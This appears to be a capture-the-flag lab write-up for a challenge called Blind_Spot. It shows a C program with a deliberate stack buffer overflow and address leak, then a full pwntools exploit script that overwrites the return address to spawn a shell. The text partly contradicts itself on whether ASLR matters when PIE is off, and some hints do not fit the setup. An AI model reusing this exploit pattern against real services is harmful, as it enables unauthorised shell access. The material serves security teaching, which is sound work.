# Challenge 04: Blind_Spot - Information Leak & ASLR Bypass

**Difficulty**: ★★★☆☆ Medium  
**Binary**: `blind_spot`  
**Port**: 1340  
**Category**: Information Disclosure / ASLR Bypass

## Description

The program leaks the address of `win()` at startup, then has a buffer overflow. ASLR is enabled (runtime), but PIE is disabled (binary base is static). You must parse the leak, calculate the runtime address of `win()`, and exploit the overflow.

## Source Code Analysis

```c
void win(void)
{
    system("/bin/sh");
}

void leak(void)
{
    printf("Here is something interesting: %p\n", (void*)win);
}

void vulnerable(void)
{
    char buffer[64];
    read(0, buffer, 256);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    leak();
    vulnerable();
    return 0;
}
```

### Vulnerabilities

1. **Information Leak**: `leak()` prints `win()` address at runtime
2. **Buffer Overflow**: `read(0, buffer, 256)` into 64-byte buffer

## Binary Protections

```bash
$ checksec --file=blind_spot
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

- **No PIE** - Binary base address is fixed (0x400000)
- **ASLR enabled at runtime** - But since no PIE, code addresses don't change!
- **Wait** - Actually with no PIE, the binary loads at fixed address. The leak is just for learning.

**Correction**: This challenge teaches the *concept* of ASLR bypass. In real scenarios with PIE, the leak would be from a shared library (libc). Here, the leak demonstrates the arithmetic.

## Exploitation

### Step 1: Receive the Leak

```bash
$ ./blind_spot
Here is something interesting: 0x401156
Enter your name: 
```

The leaked address is `win()`'s actual runtime address.

### Step 2: Calculate Offset (Static Analysis)

```bash
$ nm ./blind_spot | grep win
0000000000401156 T win
```

Static offset of `win` from binary base: `0x1156` (or whatever the actual offset is).

### Step 3: Verify Binary Base

Since no PIE, binary base is always `0x400000`.
Leaked `win` = `0x400000` + `0x1156` = `0x401156`.

### Step 4: Craft Exploit

Offset to RIP: 64 (buffer) + 8 (RBP) = **72 bytes**

```python
from pwn import *

p = process('./blind_spot')
# p = remote('localhost', 1340)

# Receive leak
p.recvuntil(b"interesting: ")
leak = int(p.recvline().strip(), 16)
log.success(f"Leaked win(): {hex(leak)}")

# Since no PIE, we can use leak directly or verify
win_addr = leak

offset = 72
payload = b'A' * offset
payload += p64(win_addr)

p.sendline(payload)
p.interactive()
```

### Real ASLR Scenario (with PIE)

If PIE were enabled:
```python
# Static offset from readelf/nm
win_offset = 0x1156

# Calculate base
binary_base = leak - win_offset
log.success(f"Binary base: {hex(binary_base)}")

# Target address at runtime
win_addr = binary_base + win_offset
```

## Flag

Successful exploit gives interactive shell. Read flag.txt.

## Key Concepts Learned

- ASLR (Address Space Layout Randomization)
- Information disclosure vulnerabilities
- Page alignment (0x1000) - lower 12 bits invariant
- Relative offsets are constant within a module
- Dynamic address calculation: `runtime_base = leak - static_offset`

## Progressive Hints

1. Run the program 5 times. Compare the printed address. What changes?
2. Look at the last 3 hex digits (e.g., ...156). Why do they stay the same?
3. Use `nm` or `readelf -s` to find the static offset of `win`. Subtract from leak to get base.